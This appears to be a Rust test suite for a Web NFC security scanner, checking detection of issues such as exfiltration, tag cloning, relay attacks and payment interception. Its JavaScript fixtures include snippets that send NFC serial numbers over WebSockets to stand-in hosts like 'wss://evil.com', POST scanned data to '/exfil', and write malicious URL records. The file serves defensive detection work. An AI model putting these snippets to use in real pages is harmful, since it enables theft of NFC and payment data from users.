use crate::web_nfc_audit::*;

#[test]
fn no_nfc_no_issues() {
    assert!(analyze_web_nfc("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_reader() {
    let body = r#"<script>const reader = new NDEFReader();</script>"#;
    let issues = analyze_web_nfc(body);
    assert!(issues.contains(&WebNfcIssue::ApiDetected));
}

#[test]
fn detects_api_writer() {
    let body = r#"<script>const writer = new NDEFWriter();</script>"#;
    let issues = analyze_web_nfc(body);
    assert!(issues.contains(&WebNfcIssue::ApiDetected));
    assert!(issues.contains(&WebNfcIssue::WriteCapability));
}

#[test]
fn detects_data_exfiltration() {
    let body = r#"<script>
        const reader = new NDEFReader();
        fetch("/api/nfc-data", {body: "data"});
    </script>"#;
    let issues = analyze_web_nfc(body);
    assert!(issues.contains(&WebNfcIssue::DataExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const reader = new NDEFReader();
        console.log(reader);
    </script>"#;
    let issues = analyze_web_nfc(body);
    assert!(!issues.contains(&WebNfcIssue::DataExfiltration));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>const reader = new NDEFReader();</script>"#;
    let issues = analyze_web_nfc(body);
    assert!(issues.contains(&WebNfcIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const reader = new NDEFReader();
        });
    </script>"#;
    let issues = analyze_web_nfc(body);
    assert!(!issues.contains(&WebNfcIssue::NoUserActivation));
}

#[test]
fn detects_write_capability() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const reader = new NDEFReader();
            await reader.write("malicious data");
        });
    </script>"#;
    let issues = analyze_web_nfc(body);
    assert!(issues.contains(&WebNfcIssue::WriteCapability));
}

#[test]
fn detects_continuous_scanning() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const reader = new NDEFReader();
            reader.scan();
            reader.onreading = (event) => console.log(event);
        });
    </script>"#;
    let issues = analyze_web_nfc(body);
    assert!(issues.contains(&WebNfcIssue::ContinuousScanning));
}

#[test]
fn detects_url_record_injection() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const reader = new NDEFReader();
            const record = new NDEFRecord({recordType: "url", data: "https://evil.com"});
        });
    </script>"#;
    let issues = analyze_web_nfc(body);
    assert!(issues.contains(&WebNfcIssue::UrlRecordInjection));
}

#[test]
fn severity_write_highest() {
    assert_eq!(web_nfc_severity(&WebNfcIssue::WriteCapability), 7.5);
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(web_nfc_severity(&WebNfcIssue::ApiDetected), 3.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![WebNfcIssue::ApiDetected, WebNfcIssue::WriteCapability];
    let mut seq = 0;
    let ops = web_nfc_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(WebNfcIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        WebNfcIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
    assert_eq!(
        WebNfcIssue::NoUserActivation.to_string(),
        "no_user_activation"
    );
    assert_eq!(WebNfcIssue::WriteCapability.to_string(), "write_capability");
    assert_eq!(
        WebNfcIssue::ContinuousScanning.to_string(),
        "continuous_scanning"
    );
    assert_eq!(
        WebNfcIssue::UrlRecordInjection.to_string(),
        "url_record_injection"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_web_nfc("").is_empty());
}

// WebNfcSecurityIssue tests

#[test]
fn security_no_nfc_no_issues() {
    assert!(analyze_web_nfc_security("<html><body>hello</body></html>").is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_web_nfc_security("").is_empty());
}

#[test]
fn detects_nfc_data_exfiltration_fetch() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
        reader.onreading = (event) => {
            fetch("/exfil", {method: "POST", body: event.serialNumber});
        };
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcDataExfiltration));
}

#[test]
fn detects_nfc_data_exfiltration_beacon() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
        navigator.sendBeacon("/track", nfcData);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcDataExfiltration));
}

#[test]
fn detects_nfc_data_exfiltration_xhr() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/api/nfc");
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcDataExfiltration));
}

#[test]
fn detects_nfc_data_exfiltration_websocket() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const ws = new WebSocket("wss://evil.com");
        reader.scan();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcDataExfiltration));
}

#[test]
fn no_exfiltration_without_send() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
        console.log("reading");
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcDataExfiltration));
}

#[test]
fn detects_nfc_tag_cloning() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
        reader.onreading = (event) => {
            const serial = event.serialNumber;
            const writer = new NDEFReader();
            writer.write(serial);
        };
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcTagCloning));
}

#[test]
fn detects_nfc_tag_cloning_readonly() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const serial = event.serialNumber;
        reader.makeReadOnly();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcTagCloning));
}

#[test]
fn no_cloning_without_serial() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.write("data");
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcTagCloning));
}

#[test]
fn detects_nfc_without_permission() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcWithoutPermission));
}

#[test]
fn no_permission_issue_with_query() {
    let body = r#"<script>
        navigator.permissions.query({name: "nfc"}).then(() => {
            const reader = new NDEFReader();
        });
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcWithoutPermission));
}

#[test]
fn no_permission_issue_with_nfc_string() {
    let body = r#"<script>
        if (permissions.includes("nfc")) {
            const reader = new NDEFReader();
        }
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcWithoutPermission));
}

#[test]
fn detects_nfc_write_abuse() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.write(userInput);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcWriteAbuse));
}

#[test]
fn no_write_abuse_with_validation() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const validated = validate(userInput);
        reader.write(validated);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcWriteAbuse));
}

#[test]
fn no_write_abuse_with_sanitize() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const clean = sanitize(data);
        reader.write(clean);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcWriteAbuse));
}

#[test]
fn detects_nfc_relay_attack() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const ws = new WebSocket("wss://relay.com");
        reader.scan();
        ws.send(nfcData);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcRelayAttack));
}

#[test]
fn detects_nfc_relay_with_writer() {
    let body = r#"<script>
        const writer = new NDEFWriter();
        const ws = new WebSocket("wss://relay.com");
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcRelayAttack));
}

#[test]
fn no_relay_without_websocket() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcRelayAttack));
}

#[test]
fn detects_nfc_cross_origin() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.onreading = (event) => {
            window.parent.postMessage(event.message.data, "*");
        };
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcCrossOrigin));
}

#[test]
fn detects_nfc_cross_origin_simple() {
    let body = r#"<script>
        const reader = new NDEFReader();
        window.postMessage(nfcData, "*");
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcCrossOrigin));
}

#[test]
fn no_cross_origin_without_postmessage() {
    let body = r#"<script>
        const reader = new NDEFReader();
        console.log(message.data);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcCrossOrigin));
}

#[test]
fn detects_nfc_persistent_reading_interval() {
    let body = r#"<script>
        const reader = new NDEFReader();
        setInterval(() => {
            reader.scan();
        }, 1000);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcPersistentReading));
}

#[test]
fn detects_nfc_persistent_reading_timeout() {
    let body = r#"<script>
        const reader = new NDEFReader();
        setTimeout(() => {
            reader.onreading = handler;
        }, 5000);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcPersistentReading));
}

#[test]
fn no_persistent_without_timers() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcPersistentReading));
}

#[test]
fn detects_nfc_payment_interception_payment() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
        const payment = processPayment(nfcData);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcPaymentInterception));
}

#[test]
fn detects_nfc_payment_interception_card() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const cardData = reader.scan();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcPaymentInterception));
}

#[test]
fn detects_nfc_payment_interception_credit() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
        const credit = parseCreditCard(nfcData);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcPaymentInterception));
}

#[test]
fn detects_nfc_payment_interception_wallet() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
        const wallet = updateWallet(reader);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcPaymentInterception));
}

#[test]
fn no_payment_interception_without_keywords() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcPaymentInterception));
}

#[test]
fn detects_nfc_in_background() {
    let body = r#"<script>
        const reader = new NDEFReader();
        reader.scan();
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcInBackground));
}

#[test]
fn no_background_with_visibility_check() {
    let body = r#"<script>
        const reader = new NDEFReader();
        document.addEventListener("visibilitychange", () => {
            reader.scan();
        });
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcInBackground));
}

#[test]
fn no_background_with_hidden_check() {
    let body = r#"<script>
        const reader = new NDEFReader();
        if (!document.hidden) {
            reader.scan();
        }
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcInBackground));
}

#[test]
fn detects_nfc_url_injection_write() {
    let body = r#"<script>
        const record = new NDEFRecord({recordType: "url", data: userUrl});
        const writer = new NDEFReader();
        writer.write([record]);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcUrlInjection));
}

#[test]
fn detects_nfc_url_injection_push() {
    let body = r#"<script>
        const records = [];
        const urlRecord = new NDEFRecord({recordType: "url", data: input});
        records.push(urlRecord);
        const writer = new NDEFReader();
        writer.write(records);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcUrlInjection));
}

#[test]
fn no_url_injection_with_url_parse() {
    let body = r#"<script>
        const parsed = URL.parse(userUrl);
        const record = new NDEFRecord({recordType: "url", data: parsed});
        writer.write([record]);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcUrlInjection));
}

#[test]
fn no_url_injection_with_new_url() {
    let body = r#"<script>
        const validated = new URL(userUrl);
        const record = new NDEFRecord({recordType: "url", data: validated});
        records.push(record);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(!issues.contains(&WebNfcSecurityIssue::NfcUrlInjection));
}

#[test]
fn security_severity_payment_highest() {
    assert_eq!(
        web_nfc_security_severity(&WebNfcSecurityIssue::NfcPaymentInterception),
        9.0
    );
}

#[test]
fn security_severity_cloning_high() {
    assert_eq!(
        web_nfc_security_severity(&WebNfcSecurityIssue::NfcTagCloning),
        8.5
    );
}

#[test]
fn security_severity_relay_high() {
    assert_eq!(
        web_nfc_security_severity(&WebNfcSecurityIssue::NfcRelayAttack),
        8.0
    );
}

#[test]
fn security_severity_background_lowest() {
    assert_eq!(
        web_nfc_security_severity(&WebNfcSecurityIssue::NfcInBackground),
        4.5
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        WebNfcSecurityIssue::NfcDataExfiltration,
        WebNfcSecurityIssue::NfcTagCloning,
    ];
    let mut seq = 0;
    let ops = web_nfc_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_vec() {
    let issues = vec![];
    let mut seq = 5;
    let ops = web_nfc_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 5);
}

#[test]
fn security_display_all_variants() {
    assert_eq!(
        WebNfcSecurityIssue::NfcDataExfiltration.to_string(),
        "nfc_data_exfiltration"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcTagCloning.to_string(),
        "nfc_tag_cloning"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcWithoutPermission.to_string(),
        "nfc_without_permission"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcWriteAbuse.to_string(),
        "nfc_write_abuse"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcRelayAttack.to_string(),
        "nfc_relay_attack"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcCrossOrigin.to_string(),
        "nfc_cross_origin"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcPersistentReading.to_string(),
        "nfc_persistent_reading"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcPaymentInterception.to_string(),
        "nfc_payment_interception"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcInBackground.to_string(),
        "nfc_in_background"
    );
    assert_eq!(
        WebNfcSecurityIssue::NfcUrlInjection.to_string(),
        "nfc_url_injection"
    );
}

#[test]
fn security_multiple_issues_detected() {
    let body = r#"<script>
        const reader = new NDEFReader();
        const ws = new WebSocket("wss://evil.com");
        setInterval(() => {
            reader.scan();
            ws.send(reader.serialNumber);
        }, 1000);
    </script>"#;
    let issues = analyze_web_nfc_security(body);
    assert!(issues.contains(&WebNfcSecurityIssue::NfcDataExfiltration));
    assert!(issues.contains(&WebNfcSecurityIssue::NfcRelayAttack));
    assert!(issues.contains(&WebNfcSecurityIssue::NfcPersistentReading));
    assert!(issues.len() >= 3);
}
